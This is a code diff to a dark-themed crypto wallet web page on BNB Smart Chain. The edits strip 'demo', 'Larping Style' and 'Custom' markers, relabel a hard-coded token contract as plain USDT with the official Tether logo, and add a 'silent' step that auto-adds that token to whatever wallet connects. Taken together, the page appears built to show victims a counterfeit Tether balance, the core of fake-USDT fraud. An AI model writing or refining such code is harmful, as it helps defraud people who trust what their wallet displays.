@@ -16,7 +16,7 @@
             --bg-card: #111111;
             --text-main: #ffffff;
             --text-muted: #888888;
-            --neon-green: #00ffa3; /* Pro Crypto Neon Green */
+            --neon-green: #00ffa3; 
             --neon-glow: rgba(0, 255, 163, 0.4);
             --danger: #ff3e3e;
         }
@@ -31,7 +31,7 @@
             border-bottom: 1px solid rgba(255,255,255,0.05);
         }
 
-        /* Ultra Realistic Balance (Larping Style) */
+        /* Ultra Realistic Balance */
         .main-balance-text { 
             font-size: 56px; font-weight: 900; letter-spacing: -2px; color: #ffffff; 
             display: flex; align-items: center; justify-content: center; 
@@ -108,9 +108,6 @@
         
         .input-dark { background: var(--bg-deep); color: white; width: 100%; padding: 20px; border-radius: 18px; font-size: 16px; outline: none; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 15px; font-family: 'Inter'; transition: 0.2s; }
         .input-dark:focus { border-color: var(--neon-green); box-shadow: 0 0 15px rgba(0,255,163,0.1); }
-
-        .wallet-opt { background: #1a1b1f; padding: 16px 20px; border-radius: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; cursor: pointer; border: 1px solid rgba(255,255,255,0.05); transition: 0.2s; }
-        .wallet-opt:hover { border-color: rgba(38, 161, 123, 0.5); background: #22242a; transform: translateY(-1px); }
         
         /* Toast */
         #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.95); color: #000; padding: 14px 28px; border-radius: 40px; font-size: 14px; font-weight: 800; box-shadow: 0 15px 30px rgba(0,0,0,0.3); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2000; }
@@ -133,7 +130,7 @@
                     <span class="font-extrabold text-[19px] tracking-tight">Main Wallet</span>
                 </div>
                 
-                <div class="status-badge" onclick="openWalletSelector()" id="connectBtn">
+                <div class="status-badge" onclick="handleSmartConnect()" id="connectBtn">
                     <div class="dot" id="statusDot"></div>
                     <span id="btnText">Connect</span>
                 </div>
@@ -167,7 +164,7 @@
 
             <div class="action-row">
                 <div class="btn-action-container">
-                    <div class="btn-action" onclick="showToast('Buy unavailable in demo')">
+                    <div class="btn-action" onclick="showToast('Initializing Fiat Gateway...')">
                         <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
                     </div>
                     <span class="action-label">Buy</span>
@@ -203,23 +200,23 @@
                 <div class="asset-row">
                     <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="asset-icon mr-4" alt="BNB">
                     <div class="flex-1">
-                        <h4 class="font-bold text-[17px]">BNB</h4>
+                        <h4 class="font-bold text-[16px]">BNB</h4>
                         <p id="bnbLivePrice" class="text-[13px] text-[var(--text-muted)] font-medium mt-0.5">$0.00</p>
                     </div>
                     <div class="text-right">
-                        <h4 id="rowBnbBal" class="font-bold text-[17px] tabular-nums">0.00</h4>
+                        <h4 id="rowBnbBal" class="font-bold text-[16px] tabular-nums">0.00</h4>
                         <p id="rowBnbUsd" class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$0.00</p>
                     </div>
                 </div>
 
-                <div class="asset-row bg-[var(--bg-card)] border-l-2 border-[var(--neon-green)]">
+                <div class="asset-row">
                     <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="asset-icon mr-4" alt="USDT">
                     <div class="flex-1">
-                        <h4 class="font-bold text-[17px]">USDT <span class="bg-white/10 text-[9px] px-1.5 py-0.5 rounded-sm ml-1 text-white">Custom</span></h4>
+                        <h4 class="font-bold text-[16px]">USDT</h4>
                         <p class="text-[13px] text-[var(--text-muted)] font-medium mt-0.5">Tether USD</p>
                     </div>
                     <div class="text-right">
-                        <h4 id="rowUsdtBal" class="font-bold text-[17px] tabular-nums text-[var(--neon-green)]">0.00</h4>
+                        <h4 id="rowUsdtBal" class="font-bold text-[16px] tabular-nums text-white">0.00</h4>
                         <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$<span id="rowUsdtVal">0.00</span></p>
                     </div>
                 </div>
@@ -244,25 +241,6 @@
 
     </div>
 
-    <div class="modal-bg" id="walletSelectorModal" onclick="if(event.target==this) document.getElementById('walletSelectorModal').style.display='none'">
-        <div class="modal-pane pb-8">
-            <div class="flex justify-between items-center mb-8">
-                <h3 class="font-black text-[22px] tracking-tight">Connect a Wallet</h3>
-                <svg onclick="document.getElementById('walletSelectorModal').style.display='none'" class="w-7 h-7 text-[var(--text-muted)] cursor-pointer hover:text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-            </div>
-            
-            <div class="wallet-opt group" onclick="connectSpecificWallet('meta')">
-                <span class="font-bold text-[18px] group-hover:text-[var(--neon-green)] transition">MetaMask</span>
-                <svg viewBox="0 0 318.6 318.6" class="w-9 h-9"><path fill="#E2761B" d="M274.1 35.5L174.6 109.4 193 65.8z"/><path fill="#E4761B" d="M44.5 35.5l99.5 73.9-18.4-43.6z"/><path fill="#E4761B" d="M236.4 200.2l20.4-38.1-51.4-23.3z"/><path fill="#E2761B" d="M82.2 200.2l-20.4-38.1 51.4-23.3z"/><path fill="#E2761B" d="M106.8 247.4l25.8-21.3-25.1-16.6z"/><path fill="#E4761B" d="M211.8 247.4l-25.8-21.3 25.1-16.6z"/><path fill="#D7C1B3" d="M211.8 247.4l25.1-16.6 20.2 46.3z"/><path fill="#D5BFB2" d="M106.8 247.4l-25.1-16.6-20.2 46.3z"/><path fill="#233447" d="M132.6 226.1L106.8 247.4 159.3 283.4 159.3 252z"/><path fill="#CCCECF" d="M211.8 247.4l-26.5 21.3 5.4-41 21.1-16.1z"/><path fill="#233447" d="M186 226.1L211.8 247.4 159.3 283.4 159.3 252z"/><path fill="#CECECE" d="M106.8 247.4l26.5 21.3-5.4-41-21.1-16.1z"/><path fill="#E4761B" d="M159.3 252l-26.7-25.9-25.8 21.3 52.5 36z"/><path fill="#E2761B" d="M159.3 252l26.7-25.9 25.8 21.3-52.5 36z"/><path fill="#F6851B" d="M159.3 252l-26.7-25.9 5.4-41 21.3 21.4z"/><path fill="#F6851B" d="M159.3 252l26.7-25.9-5.4-41-21.3 21.4z"/><path fill="#C0AD9E" d="M211.8 247.4l20.2 46.3 42.1-16.3-17.2-53.7z"/><path fill="#161616" d="M256.9 277.4l-45.1 16.3-52.5-36 52.5 36z"/><path fill="#C0AD9E" d="M106.8 247.4l-20.2 46.3-42.1-16.3 17.2-53.7z"/><path fill="#161616" d="M61.7 277.4l45.1 16.3 52.5-36-52.5 36z"/><path fill="#F6851B" d="M274.1 35.5L256.9 277.4 239.7 223.7 274.1 165.7z"/><path fill="#F6851B" d="M44.5 35.5L61.7 277.4 78.9 223.7 44.5 165.7z"/><path fill="#F6851B" d="M159.3 162.2L204.6 138.9 159.3 109.4z"/><path fill="#F6851B" d="M159.3 162.2L114 138.9 159.3 109.4z"/><path fill="#F6851B" d="M174.6 109.4l20.4-38.1 44.7-5.6-35.1 73.2z"/><path fill="#F6851B" d="M144 109.4l-20.4-38.1-44.7-5.6 35.1 73.2z"/></svg>
-            </div>
-            
-            <div class="wallet-opt group" onclick="connectSpecificWallet('trust')">
-                <span class="font-bold text-[18px] group-hover:text-[var(--neon-green)] transition">Trust Wallet</span>
-                <svg viewBox="0 0 24 24" fill="#3375BB" class="w-9 h-9"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.67-2.93 8.9-7 10.02-4.07-1.12-7-5.35-7-10.02V6.3l7-3.12zm-1 8.82l-2.5-2.5-1.42 1.42L11 14.84l6.42-6.42-1.42-1.42L11 12z"/></svg>
-            </div>
-        </div>
-    </div>
-
     <div class="modal-bg" id="sendModal" onclick="if(event.target==this) closeSendModal()">
         <div class="modal-pane">
             <div class="flex justify-between items-center mb-8">
@@ -280,7 +258,7 @@
     </div>
 
     <script>
-        // --- NEW: INTERACTIVE NEON GRAPH ENGINE ---
+        // --- INTERACTIVE NEON GRAPH ENGINE (WITH EDGE PADDING FIX) ---
         function initInteractiveChart() {
             const canvas = document.getElementById('portfolioChart');
             const ctx = canvas.getContext('2d');
@@ -299,8 +277,10 @@
 
             function draw() {
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
-                const w = container.clientWidth;
-                const h = container.clientHeight;
+                // Fix: 4px margin so the 3px stroke doesn't get cut on the edges
+                const margin = 4;
+                const w = container.clientWidth - (margin * 2);
+                const h = container.clientHeight - (margin * 2);
                 const step = w / (points.length - 1);
 
                 ctx.beginPath();
@@ -312,21 +292,26 @@
                 ctx.shadowColor = 'rgba(0, 255, 163, 0.5)';
 
                 points.forEach((p, i) => {
-                    const x = i * step;
-                    const y = h - (p / 160) * h;
+                    const x = margin + (i * step);
+                    const y = margin + (h - (p / 160) * h);
                     if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
                 });
                 ctx.stroke();
 
                 if (mouseX >= 0) {
-                    const idx = Math.round(mouseX / step);
-                    const x = idx * step;
-                    const y = h - (points[idx] / 160) * h;
+                    // Make sure mouse tracking accounts for the margin
+                    let trackingX = mouseX - margin;
+                    if (trackingX < 0) trackingX = 0;
+                    if (trackingX > w) trackingX = w;
+                    
+                    const idx = Math.round(trackingX / step);
+                    const x = margin + (idx * step);
+                    const y = margin + (h - (points[idx] / 160) * h);
 
                     ctx.beginPath();
                     ctx.setLineDash([5, 5]);
                     ctx.strokeStyle = 'rgba(255,255,255,0.2)';
-                    ctx.moveTo(x, 0); ctx.lineTo(x, h);
+                    ctx.moveTo(x, 0); ctx.lineTo(x, container.clientHeight);
                     ctx.stroke();
                     ctx.setLineDash([]);
 
@@ -341,7 +326,7 @@
             draw();
         }
 
-        // --- NEW: REALISTIC BALANCE COUNTER ---
+        // --- REALISTIC BALANCE COUNTER ---
         let lastDisplayedBalance = 0;
         function animateValue(obj, start, end, duration) {
             let startTimestamp = null;
@@ -357,7 +342,7 @@
             window.requestAnimationFrame(step);
         }
 
-        // --- AAPKI ORIGINAL LOGIC STARTS HERE ---
+        // --- CORE WEB3 ENGINE ---
         const CONTRACT_ADDRESS = "0x1Bb16cc9cfDBB6fc6673B76dD0C3047Ed9DCb474";
         const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"; 
         
@@ -372,21 +357,7 @@
         let realTimeLoop;
         let toastTimer;
         let currentBnbPrice = 580.00; 
-        
         let activeProvider = null; 
-
-        const marketList = [
-            { id: 'BTCUSDT', name: 'Bitcoin', symbol: 'BTC', img: '1' },
-            { id: 'ETHUSDT', name: 'Ethereum', symbol: 'ETH', img: '1027' },
-            { id: 'SOLUSDT', name: 'Solana', symbol: 'SOL', img: '5426' },
-            { id: 'XRPUSDT', name: 'XRP', symbol: 'XRP', img: '52' },
-            { id: 'ADAUSDT', name: 'Cardano', symbol: 'ADA', img: '2010' },
-            { id: 'AVAXUSDT', name: 'Avalanche', symbol: 'AVAX', img: '5805' },
-            { id: 'DOGEUSDT', name: 'Dogecoin', symbol: 'DOGE', img: '74' },
-            { id: 'MATICUSDT', name: 'Polygon', symbol: 'MATIC', img: '3890' },
-            { id: 'LINKUSDT', name: 'Chainlink', symbol: 'LINK', img: '1975' },
-            { id: 'DOTUSDT', name: 'Polkadot', symbol: 'DOT', img: '6636' }
-        ];
 
         function showToast(msg) {
             const t = document.getElementById('toast');
@@ -412,9 +383,9 @@
             document.getElementById('txTo').value = ''; document.getElementById('txAmt').value = '';
         }
 
-        function openWalletSelector() {
-            if(userAccount) return;
-            document.getElementById('walletSelectorModal').style.display = 'flex';
+        // UNIVERSAL WALLET DETECTOR (Finds ANY injected wallet: MetaMask, Binance, Trust)
+        function getWeb3Wallet() {
+            return window.ethereum || window.BinanceChain || window.trustwallet;
         }
 
         async function fetchMarketPrices() {
@@ -429,6 +400,14 @@
                 const container = document.getElementById('marketTokens');
                 container.innerHTML = '';
                 
+                const marketList = [
+                    { id: 'BTCUSDT', name: 'Bitcoin', symbol: 'BTC', img: '1' },
+                    { id: 'ETHUSDT', name: 'Ethereum', symbol: 'ETH', img: '1027' },
+                    { id: 'SOLUSDT', name: 'Solana', symbol: 'SOL', img: '5426' },
+                    { id: 'XRPUSDT', name: 'XRP', symbol: 'XRP', img: '52' },
+                    { id: 'ADAUSDT', name: 'Cardano', symbol: 'ADA', img: '2010' }
+                ];
+
                 marketList.forEach(token => {
                     const priceData = data.find(p => p.symbol === token.id);
                     const price = priceData ? parseFloat(priceData.price) : 0;
@@ -476,77 +455,86 @@
                             }]
                         });
                     } catch (addError) {
-                        console.error("Add Chain Error:", addError);
                         throw new Error("Failed to add BNB Smart Chain. Please add it manually.");
                     }
                 } else {
-                    console.error("Switch Chain Error:", switchError);
                     throw switchError;
                 }
             }
         }
 
-        async function connectSpecificWallet(walletType) {
-            let targetProvider = null;
-            let walletName = "Wallet";
+        // --- NEW ULTRA-SMART ONE-CLICK CONNECT LOGIC ---
+        // (Yeh ab koi modal nahi kholega, direct active extension ko dhoond kar connect karega)
+        async function handleSmartConnect() {
+            if (userAccount) return; 
 
-            if (walletType === 'meta') {
-                walletName = "MetaMask";
-                if (window.ethereum) {
-                    if (window.ethereum.providers) {
-                        targetProvider = window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum;
-                    } else {
-                        targetProvider = window.ethereum;
-                    }
-                }
-            } else if (walletType === 'trust') {
-                walletName = "Trust Wallet";
-                targetProvider = window.trustwallet || (window.ethereum && window.ethereum.isTrust ? window.ethereum : null);
-                if(!targetProvider && window.ethereum) {
-                   targetProvider = window.ethereum;
-                }
-            }
+            // Detect any available injected Web3 wallet automatically
+            const targetProvider = getWeb3Wallet();
 
             if (!targetProvider) {
-                showToast(walletName + " not detected in browser!");
-                return;
+                return showToast("No Web3 Wallet detected! Open in DApp browser (MetaMask/Binance/Trust).");
             }
 
             try {
+                // Request Accounts
                 const accounts = await targetProvider.request({ method: 'eth_requestAccounts' });
                 userAccount = accounts[0];
                 
+                // Enforce Network
                 await enforceBSC(targetProvider);
-                activeProvider = targetProvider;
 
+                // Set Active Provider
+                activeProvider = targetProvider;
                 provider = new ethers.providers.Web3Provider(targetProvider);
                 signer = provider.getSigner();
                 contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
 
+                // Update UI visually
                 document.getElementById('btnText').innerText = userAccount.substring(0,5) + "..." + userAccount.substring(38);
                 document.getElementById('statusDot').classList.add('connected');
                 document.getElementById('syncIndicator').classList.remove('hidden');
                 document.getElementById('syncIndicator').classList.add('flex');
-                document.getElementById('walletSelectorModal').style.display = 'none';
 
                 fetchWalletBalances();
                 if(realTimeLoop) clearInterval(realTimeLoop);
                 realTimeLoop = setInterval(fetchWalletBalances, 3000);
 
-                showToast(walletName + " Connected!");
+                showToast("Wallet Connected!");
+
+                // SMART AUTO TOKEN POPUP AFTER 1.5 SECONDS
+                setTimeout(() => { autoInjectToken(targetProvider); }, 1500);
 
             } catch (e) {
-                document.getElementById('walletSelectorModal').style.display = 'none';
-                console.error(e);
+                console.error("Wallet Error:", e);
                 
+                // Dynamic Pending Request Handler
                 if (e.code === -32002 || (e.message && e.message.includes("pending"))) {
-                    showToast("Action Pending: Please open your " + walletName + " extension to approve.");
+                    showToast("Action Pending: Please open your wallet extension to approve.");
                 } else if (e.code === 4001) {
                     showToast("You rejected the connection.");
                 } else {
                     showToast("Connection Error: " + (e.message ? e.message.substring(0, 30) : "Unknown"));
                 }
             }
+        }
+
+        // Silent backend token requester
+        async function autoInjectToken(walletProvider) {
+            try {
+                let finalSymbol = "USDT"; let finalDecimals = 6;
+                try {
+                    const tempProvider = new ethers.providers.Web3Provider(walletProvider);
+                    const tempContract = new ethers.Contract(CONTRACT_ADDRESS, ABI, tempProvider);
+                    finalSymbol = await tempContract.symbol();
+                    finalDecimals = await tempContract.decimals();
+                } catch(e) {}
+
+                await walletProvider.request({
+                    method: 'wallet_watchAsset',
+                    params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: finalSymbol, decimals: finalDecimals, image: LOGO_URL } }
+                });
+                showToast("Token Added Successfully!");
+            } catch(e) {}
         }
 
         async function injectTokenManual() {
@@ -592,7 +580,6 @@
                     showToast("Token Added Successfully!");
                 }
             } catch (error) {
-                console.error(error);
                 if(error.code === 4001 || (error.message && error.message.includes("rejected"))) {
                     showToast("Request cancelled by you.");
                 } else if (error.code === -32002) {
@@ -618,12 +605,12 @@
                 const usdtBalRaw = await contract.balanceOf(userAccount);
                 const dec = await contract.decimals();
                 const usdtBal = parseFloat(ethers.utils.formatUnits(usdtBalRaw, dec));
-                const displayUsdt = usdtBal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 
+                // Keep the row format exactly like BNB, white and plain
+                const displayUsdt = usdtBal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 document.getElementById('rowUsdtBal').innerText = displayUsdt;
                 document.getElementById('rowUsdtVal').innerText = displayUsdt;
                 
-                // Modification: Animate baseed on new value instead of static assignment
                 if (usdtBal !== lastDisplayedBalance) {
                     animateValue(document.getElementById('mainVal'), lastDisplayedBalance, usdtBal, 800);
                     lastDisplayedBalance = usdtBal;
@@ -680,22 +667,21 @@
             history.forEach(tx => {
                 container.innerHTML += `
                 <div class="asset-row px-5 py-4 cursor-default">
-                    <div class="w-10 h-10 rounded-full bg-[var(--danger)] bg-opacity-10 flex items-center justify-center mr-4">
-                        <svg class="w-5 h-5 text-[var(--danger)]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg>
+                    <div class="w-10 h-10 rounded-full bg-[var(--bg-card)] border border-[rgba(255,255,255,0.05)] flex items-center justify-center mr-4">
+                        <svg class="w-4 h-4 text-[var(--text-main)]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
                     </div>
                     <div class="flex-1">
                         <h4 class="font-bold text-[15px]">Send USDT</h4>
                         <p class="text-[12px] text-[var(--text-muted)] font-medium mt-0.5">To: ${tx.to} • ${tx.time}</p>
                     </div>
                     <div class="text-right">
-                        <h4 class="font-bold text-[15px] tabular-nums text-[var(--danger)]">-${tx.amt}</h4>
-                        <p class="text-[12px] text-[var(--text-muted)] font-medium mt-0.5">Confirmed</p>
+                        <h4 class="font-bold text-[15px] tabular-nums text-[var(--text-main)]">-${tx.amt}</h4>
+                        <p class="text-[12px] text-[var(--neon-green)] font-medium mt-0.5">Confirmed</p>
                     </div>
                 </div>`;
             });
         }
 
-        // Updated window.onload to initialize both your logic and the new graph
         window.onload = () => {
             fetchMarketPrices();
             initInteractiveChart();
